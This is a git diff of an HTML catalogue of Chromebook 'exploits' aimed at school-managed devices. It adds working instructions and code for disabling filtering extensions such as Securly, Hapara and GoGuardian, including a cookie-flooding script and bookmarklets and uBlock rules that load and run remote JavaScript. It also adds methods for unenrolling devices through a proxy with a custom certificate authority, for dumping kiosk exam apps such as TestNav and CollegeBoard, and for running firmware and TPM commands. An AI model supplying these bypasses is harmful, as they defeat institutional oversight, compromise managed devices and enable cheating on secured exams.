@@ -76,7 +76,7 @@
                     <li><input class="esterm" esterm-value="OS" type="checkbox" checked=true>OS Based</li>
                     <li><input class="esterm" esterm-value="Proxy" type="checkbox" checked=true>Proxy Based</li>
                     <li><input class="esterm" esterm-value="Web" type="checkbox" checked=true>Web Based</li>
-                </ul>
+                </ul> 
                 <label>Blocker</label>
                 <ul>
                     <li><input class="esterm" esterm-value="Blocksi" type="checkbox">Blocksi</li>
@@ -104,6 +104,7 @@
                         <summary>chrome://</summary>
                         <li><input class="esterm" esterm-value="chrome://flags" type="checkbox">chrome://flags</li>
                         <li><input class="esterm" esterm-value="chrome://network" type="checkbox">chrome://network</li>
+                        <li><input class="esterm" esterm-value="chrome://network" type="checkbox">chrome://net-internals</li>
                     </details>
                     <details>
                         <summary>Extension</summary>
@@ -144,11 +145,13 @@
             <br>
             <a href="#HPFSB">Hapara Focus Session Bypass</a>
             <br>
+            <a href="#HSTS">HSTS</a>
+            <br>
             <a href="#Killcurly">Killcurly</a>
             <br>
-            <a href="#Ingot">Ingot</a>
+            <a href="#IncognitoExploit">Incognito Exploit</a>
             <br>
-            <a href="#INSECURELY">INSECURELY</a>
+            <a href="#Ingot">Ingot</a>
             <br>
             <a href="#LoMoH">LoMoH</a>
             <br>
@@ -166,6 +169,10 @@
             <a href="#PB">Point-Blank</a>
             <br>
             <a href="#Quickview">Quickview</a>
+            <br>
+            <a href="#Rigtools">Rigtools</a>
+            <br>
+            <a href="#Securely-Kill">Securely-Kill</a>
             <br>
             <a href="#Sidetracked">Sidetracked</a>
             <br>
@@ -185,7 +192,10 @@
             <br>
             <a href="#URLUnblocker">URL Unblocker</a>
             <br>
+            <br>
             <a href="#AdminLockBypass">Admin Lock Bypass</a>
+            <br>
+            <a href="#BadRecovery">BadRecovery</a>
             <br>
             <a href="#Blank3r">Blank3r</a>
             <br>
@@ -194,6 +204,8 @@
             <a href="#BlobBypass">BlobBypass</a>
             <br>
             <a href="#BlobWiFi">BlobWiFi</a>
+            <br>
+            <a href="#BR1CK">BR1CK</a>
             <br>
             <a href="#ByeBlocker">ByeBlocker</a>
             <br>
@@ -205,6 +217,8 @@
                         <li><a href="#CAUBFlagMethod">Flag Method</a></li>
                     </ul>
             </details>
+            <a href="#ChrioskDumping">Chriosk Dumping</a>
+            <br>
             <a href="#CRSH2TTY">CRSH2TTY</a>
             <br>
             <a href="#Cryptosmite">Cryptosmite</a>
@@ -214,6 +228,8 @@
             <a href="#E-Halcyon">E-Halcyon</a>
             <br>
             <a href="#EL">Extension Launcher</a>
+            <br>
+            <a href="#Icarus">Icarus</a>
             <br>
             <a href="#KVS">KVS</a>
             <br>
@@ -226,7 +242,7 @@
                     <ul>
                         <li><a href="#SH1MMERLegacy">SH1MMER Legacy</a></li>
                         <li><a href="#SH1MMERModern">SH1MMER Modern</a></li>
-                        <li><a href="#SH1MMERScrewdriverUnfog">Screwdriver Unfog</a><br></li>
+                        <li><a href="#SH1MMERPencilMethod">Pencil Method</a><br></li>
                     </ul>
             </details>
             <a href="#Shimboot">Shimboot</a>
@@ -237,11 +253,14 @@
             <br>
             <a href="#SourceView">Source View</a>
             <br>
+            <a href="#uBlock Run">uBlock Run</a>
+            <br>
             <a href="#USBoot">USBoot</a>
             <br>
             <a href="#uRun">uRun</a>
             <br>
             <a href="#PPT">Policy Password Tool</a>
+            <br>
             <br>
             <a href="#CroshFi">CroshFi</a>
             <br>
@@ -372,7 +391,7 @@
         <br>
         <details>
             <searchi>Web</searchi>
-            <searchi>Blocksi;GoGuardian;Hapara;iBoss;Securely</searchi>
+            <searchi>Hapara</searchi>
             <searchi>InspectElement</searchi>
             <summary><b id="Chaos">Chaos</b></summary>
             <p class="small-text">Requires Devtools.
@@ -486,6 +505,29 @@
         <br>
         <details>
             <searchi>Web</searchi>
+            <searchi>Hapara;iBoss</searchi>
+            <searchi>chrome://net-internals</searchi>
+            <summary><b id="HSTS">HSTS</b></summary>
+            <p class="small-text">Requires chrome://net-internals access.
+            <br>
+            Bypasses extensions that also use a Chrome app. Hapara & iBoss are known to work.
+            <br>
+            Web-based exploit.</p>
+            <br>
+            1: Go to chrome://net-internals & click the "Domain Security Policy" tab.
+            <br>
+            2: Insert 127.0.0.1 in the "Add HSTS domain’s Domain" textbox, then click "Add".
+            <br>
+            3: Repeat step 2, but use "localhost" instead of 127.0.0.1.
+            <br>
+            4: Restart your computer (chrome://restart).
+            <br>
+            <br>
+            If you have a force-installed extension & have a Chrome app from the same developer force-installed, it’s worth giving this a try.
+        </details>
+        <br>
+        <details>
+            <searchi>Web</searchi>
             <searchi>Blocksi;GoGuardian;Hapara;iBoss;Securely</searchi>
             <searchi>Bookmarklets</searchi>
             <summary><b id="HFSB">Hapara Focus Session Bypass</b></summary>
@@ -522,6 +564,28 @@
         </details>
         <br>
         <details>
+            <searchi>Web</searchi>
+            <searchi>Blocksi;GoGuardian;Hapara;iBoss;Securely</searchi>
+            <searchi>InspectElement</searchi>
+            <summary><b id="IncognitoExploit">Incognito Exploit</b></summary>
+            <p class="small-text">Patched on Chrome OS 82+
+            <br>
+            Allows you to enter Incognito mode.
+            <br>
+            Web-based exploit.</p>
+            <br>
+            1: Enter your username & password, but don't sign in.
+            <br>
+            2: Press Alt+Shift+I & spam the "Privacy Policy" for ~30-60 seconds.
+            <br>
+            3: Login, quickly go to the Incognito tab, then press Ctrl+Shift+N.
+            <br>
+            4: Close the original Incognito tab.
+            <br>
+            5: If it continues to open policy pages, repeat Step 4.
+        </details>
+        <br>
+        <details>
             <searchi>v106</searchi>
             <searchi>Web</searchi>
             <searchi>Blocksi;GoGuardian;Hapara;iBoss;Securely</searchi>
@@ -531,8 +595,7 @@
             <br>
             A menu to disable extensions & enable extension Dev Mode. The successor UI to LTBEEF.
             <br>
-            Web-based exploit.
-            </p>
+            Web-based exploit.</p>
             <br>
             1: Make a bookmarklet with this <a href="javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())">code.</a>
             <br>
@@ -540,16 +603,25 @@
         </details>
         <br>
         <details>
+            <searchi>v128</searchi>
             <searchi>Web</searchi>
             <searchi>Blocksi;GoGuardian;Hapara;iBoss;Securely</searchi>
-            <summary><b id="INSECURELY">INSECURELY</b></summary>
-            <p class="small-text">Patched on Securely versions above 2.98.55
+            <summary><b id="#Rigtools">Rigtools</b></summary>
+            <p class="small-text">Patched on Chrome OS 129+
             <br>
-            A toggle that kills Securely using black magic.
+            Allows you to do a ton of things (with the right permissions).
             <br>
             Web-based exploit.</p>
             <br>
-            1: Go <a href="https://ext-remover.net/detail/INSECURLY/">here</a> & flip the switch.
+            1: Keep <a hre="devtools://devtools/bundled/devtools_app.html">this</a> website open in a new tab.
+            <br>
+            2: Open <a href="devtools://devtools/bundled/devtools_app.html?experiments=true&ws=rig.kxtz.dev/">this</a> website & go to Network.
+            <br>
+            3: Double-click the black/grey box.
+            <br>
+            4: Click "extension-ID" & find your the extension ID of the extension you want to disable, then paste it in. It should load a filesystem: page. You can have other extensions under it.
+            <br>
+            5: Run <a href="chrome.browserAction.onClicked.addListener(() => {chrome.tabs.executeScript(null, {code: `location.href="javascript:{bookmarklet here}";`});});">this</a> code. Note it won't work if your extension's manifest file doesn't have the proper permissions.
         </details>
         <br>
         <details>
@@ -720,6 +792,49 @@
             2: On that same page, double click the opener.
             <br>
             3: On the newly opened tab, run the bookmarklet.
+        </details>
+        <br>
+        <details>
+            <searchi>Web</searchi>
+            <searchi>Securely</searchi>
+            <searchi>uBlockOrigin</searchi>
+            <summary><b id="Securly-Kill">Securely-Kill</b></summary>
+            <p class="small-text">Requies uBlock Origin
+            <br>
+            A toggle that kills Securely using black magic.
+            <br>
+            Web-based exploit.</p>
+            <br>
+            1: Install uBlock Origin & preform <a href="#uRun">uRun</a>.
+            <br>
+            2: Go <a href="https://securly.com/">here</a> (it's fine if it says blocked), then press Ctrl+Shift+~ & keep the tab open.
+            <br>
+            3: Remove uRun & set up <a href="#uBlockRun">uBlock Run</a>.
+            <br>
+            4: Go back, press Ctrl+Shift+~ again, & paste <a href="const e = document.querySelectorAll("div.head-top, div.wonderbar");
+            e.forEach(function(t) {
+                t.remove()
+            });
+            const a = document.querySelectorAll("button.slick-prev.slick-arrow.slick-disabled, button.slick-next.slick-arrow.slick, button.slick-prev.slick-arrow, button.slick-next.slick-arrow.slick-disabled"),
+                i = document.createElement("iframe");
+            i.style.position = "fixed", i.style.top = "0", i.style.left = "0", i.style.width = "100%", i.style.height = "100%", i.style.border = "none", i.style.backgroundColor = "white", document.body.appendChild(i);
+            const b = document.createElement("button");
+            b.style.position = "fixed", b.style.top = "50%", b.style.left = "50%", b.style.transform = "translate(-50%, -50%)", b.style.width = "800px", b.style.height = "200px", b.style.borderRadius = "100px", b.style.backgroundColor = "red", b.style.color = "white", b.style.fontSize = "100px", b.style.fontWeight = "bold", b.style.cursor = "pointer", b.textContent = "OFF", b.addEventListener("click", function() {
+                if ("OFF" === this.textContent) {
+                    this.style.backgroundColor = "blue", this.textContent = "ON";
+                    let t = new Date(2e14).toUTCString(),
+                        o = location.hostname.split(".").slice(-2).join(".");
+                    for (let l = 0; l < 99; l++) document.cookie = `cd${l}=${encodeURIComponent(btoa(String.fromCharCode.apply(0,crypto.getRandomValues(new Uint8Array(3168))))).substring(0,3168)};expires=${t};domain=${o};path=/`;
+                    alert("Securly Successfully Killed.")
+                } else {
+                    let s = new Date(2e14).toUTCString(),
+                        n = location.hostname.split(".").slice(-2).join(".");
+                    for (let r = 0; r < 99; r++) document.cookie = `cd${r}=${encodeURIComponent(btoa(String.fromCharCode.apply(0,crypto.getRandomValues(new Uint8Array(32))))).substring(0,32)};expires=${s};domain=${n};path=/`;
+                    alert("For some reason, you gave Securly CPR and it came back to life."), this.style.backgroundColor = "red", this.textContent = "OFF"
+                }
+            }), i.contentDocument.body.appendChild(b);">this</a> into the eval prompt & press enter.
+            <br>
+            5: Click the big red off button to kill the extension.
         </details>
         <br>
         <details>
@@ -980,7 +1095,7 @@
         <br>
         <details>
             <searchi>v120</searchi>
-            <searchi>OS; Unenrollment</searchi>
+            <searchi>OS;Unenrollment</searchi>
             <searchi>ExternalPC;ExternalStorage</searchi>
             <summary><b id="BadRecovery">BadRecovery</b></summary>
             <p class="small-text">Requires a storage device, another PC
@@ -1001,7 +1116,7 @@
             <br>
             <img src="..\Images\BadRecoveryModeOperations.PNG" alt="image lmao">
             <br>
-            R125 recovery images & newer are not vulnerable to this (except unverified). To determine if you can use this, follow these in order:
+            Version 125+ recovery images & newer are not vulnerable to this (except unverified). To determine if you can use this, follow these in order:
             <ul>
                 <li>Was your device EOL before 2024? (YES)</li>
                 <li>Are you on ChromeOS version 124 or lower? (YES)</li>
@@ -1064,6 +1179,19 @@
         </details>
         <br>
         <details>
+            <searchi>OS;Unenrollment</searchi>
+            <searchi>ExternalPC;ExternalStorage</searchi>
+            <summary><b id="BR1CK">BR1CK</b></summary>
+            <p class="small-text">Certain boards are incompatible
+            <br>
+            Unenrolls your Chromebook.
+            <br>
+            OS-based exploit.</p>
+            <br>
+            1: jesus christ just visit <a href="https://br1ck.vercel.app/">here</a> for now
+        </details>
+        <br>
+        <details>
             <searchi>Web</searchi>
             <searchi>Bookmarklets</searchi>
             <summary><b id="CAC">Car Axle Client</b></summary>
@@ -1113,6 +1241,35 @@
                 <br>
                 2: Open Settings & go to Network >> Your WiFi >> Advanced >> Show metered toggle & turn it on.
             </details>
+        </details>
+        <br>
+        <details>
+            <searchi>OS</searchi>
+            <searchi>DevMode;ExternalStorageDevice</searchi>
+            <summary><b id="ChrioskDumping">Chriosk Dumping</b></summary>
+            <p class="small-text">Requires Crosh, Dev Mode
+            <br>
+            Dump any kiosk app & then make it a regular Chrome OS app.
+            <br>
+            Chrome OS-based exploit.</p>
+            <br>
+            1: Enable Dev Mode, then add your home & then your school account.
+            <br>
+            2: Open Crosh (Crtl+Alt+T) & run "shell", then go to "/home/chronos/{user account hash}/extentions/kiosk/" & find the ID of the kiosk app you want to dump.
+            <br>
+            TestNav: mdmkkicfmmkgmpkmkdikhlbggogpicma
+            <br>
+            SecureTestBrowser: hblfbmjdaalalhifaajnnodlkiloengc
+            <br>
+            NWEA: omkghcboodpimaoimdkmigofhjcpmpeb
+            <br>
+            CollegeBoard: joaneffahikmmipmidpkeedopejmhbbm
+            <br>
+            3: Back it up to your downloads folder by running "cp /home/chronos/{user account hash}/extentions/kiosk/(app ID) /home/chronos/{user account ID hash}/Downloads/".
+            <br>
+            4: Go into the folder & edit the "manifest.json" file. Delete the "kiosk_only" : true" line.
+            <br>
+            5: Load the folder with Extension Dev Mode in chrome://extensions (click "Load Unpacked").
         </details>
         <br>
         <details>
@@ -1276,6 +1433,46 @@
         </details>
         <br>
         <details>
+            <searchi>OS Based</searchi>
+            <searchi>ProxyBased</searchi>
+            <searchi>ExternalPC</searchi>
+            <searchi>ExternalStorageDevice</searchi>
+            <searchi>Powerwash</searchi>
+            <searchi>RecoveryMode</searchi>
+            <searchi>Unenrollment</searchi>
+            <summary><b id="Icarus">Icarus</summary><p class="small-text">Requires a storage device, another PC
+                <br>
+                Unenrolls devices with device management interception using a proxy & a custom Certificate Authority.
+                <br>
+                Chrome OS-based exploit.</p>
+                <br>
+                1: On an external PC, clone the repo with "git clone --recursive https://github.com/MunyDev/icarus/" & change directory to it.
+                <br>
+                2: Set up the environment by running the following commands (Make sure you have python3, python3-venv, & protobuf installed beforehand): 
+                <br>
+                make setup-venv
+                <br>
+                make enter-venv
+                <br>
+                make setup-python
+                <br>
+                make build-packed-data"
+                <br>
+                3: Before continuing, open Chrome on your build machine & go to chrome://components. Press CTRL+F & search for "PKIMetadata". Once you find it, press "Check for Updates". Make sure it says up-to-date before continuing (& that the version is below 2000.)
+                <br>
+                4: Run bash "get_original_data.sh" & "bash make_out.sh myCA.der". After doing this the output directory (from here on reffered to as PKIMetadata) will be generated, which is the custom Certificate Authority.
+                <br>
+                5: Run "bash modify.sh {shim path}" & then boot the shim. 
+                <br>
+                6: Run make start-server on the external PC to start your proxy, then continue with the instructions. Do not use WSL to host a server. This server is only required for the unenrollment.
+                <br>
+                7: Reboot the device. You'll boot into verified mode. Once you have your server running, open the network configuration by clicking the lower right button (it will show the date), connecting to wifi, & then change the proxy settings accordingly.
+                Set proxy settings to manual & the HTTPS IP to the IP you used to host the proxy server.
+                <br>
+                8: Resume setup & your device will unenroll.
+        </details>
+        <br>
+        <details>
             <searchi>OS</searchi>
             <searchi>RecoveryMode</searchi>
             <summary><b id="KVS">KVS</b></summary>
@@ -1396,33 +1593,9 @@
                 <br>
                 The fog...
                 <br>
-                Google has "patched" SH1MMER Modern on Chromebooks that have been on version 112+. However, there are extra steps to get it to work properly, as seen below.
+                Google has "patched" SH1MMER Modern on Chromebooks that have been on version 114+. However, there are extra steps to get it to work properly, as seen <a href="https://blog.darkn.bio/blog/3-the-tsunami#bypassing-instructions">here</a>. Unfortunately, they are quite hard & not for beginners.
                 <br>
-                <br>
-                <searchi>Hardware</searchi>
-                <searchi>Screwdriver</searchi>
-                <details>
-                    <summary><b id="SH1MMERScrewdriverUnfog">Screwdriver Unfog</b></summary>
-                    <p class="small-text">Requires screwdriver; Dev Mode; Chromebook on version 113 or lower.</p>
-                    <br>
-                    1: Use the Admin Lock Bypass above, but don't insert the battery.
-                    <br>
-                    2: Enter Dev Mode & boot into SH1MMER.
-                    <br>
-                    3: Go into Bash Shell by using "Open Bash", then run "/usr/share/vboot/bin/set_gbb_flags.sh 0x8090". After using this command, DON'T use "Reset GBB Flags".
-                    <br>
-                    4: Exit SH1MMER & turn off your Chromebook. Unplug the charger, reconnect the battery, & then reconnect the charger.
-                    <br>
-                    5: Enter Dev Mode, then powerwash the Chromebook (Ctrl+Alt+Shift+R), then immediately enter the Chrome OS shell with Ctrl+Alt+F2+Enter.
-                    <br>
-                    6: Log into the user as root, then run "tpm_manager_client take_ownership" & "cryptohome --action=remove_firmware_management_parameters". If it fails, downgrade to version 110 or use E-Halycon instead.
-                    <br>
-                    7: Exit with Ctrl+Alt+F1+Backspace, then powerwash again. If you want to change version, continue.
-                    <br>
-                    8: Repeat steps 1-3, running these commands instead: "/usr/share/vboot/bin/set_gbb_flags.sh 0x8090", "tpm_manager_client take_ownership", & "chromeos-tpm-recovery". If it doesn't work, run "flashrom --wp-disable" & restart.
-                    <br>
-                    9: Repeat step 4. You can now install any Chrome OS version. If you get an error again, repeat steps 8-9.
-                </details>
+                <b>DO NOT USE IT ON Ti50 CHIP DEVICES (CORSOLA & NISSA), IT WILL BRICK YOUR DEVICE.</b>
             </details>
             <br>
             <br>
@@ -1552,6 +1725,26 @@
             1: Go to a website & view its source code with Ctrl+U or by using the View Source bookmarklet.
             <br>
             2: Copy everything from the newly opened tab & paste it in a site like <a href="https://www.w3schools.com/html/tryit.asp?filename=tryhtml_basic">this.</a>
+        </details>
+        <br>
+        <details>
+            <searchi>Web</searchi>
+            <searchi>uBlockOrigin</searchi>
+            <summary><b id="uBlockRun">uBlock Run</b></summary>
+            <p class="small-text">uBlock Origin exclusive
+            <br>
+            Unblocks bookmarklets. Older version of uRun.
+            <br>
+            Web-based exploit.</p>
+            <br>
+            1: Go to uBlock Origin’s settings page & check the “I am an advanced user” box, then click on the small cog icon.
+            <br>
+            2: Find “userResourcesLocation unset" & change it from "unset" to "https://raw.githubusercontent.com/3kh0/ext-remover/main/ublockExec.js".
+            <br>
+            3: Go to the “My filters” tab & add a line with “*##+js(execute_script.js)”, then run the code on the current page (Ctrl+Alt+~).
+            <br>
+            <br>
+            The only reason to use this is for <a href="#Securely-Kill">Securely-Kill</a>.
         </details>
         <br>
         <details>
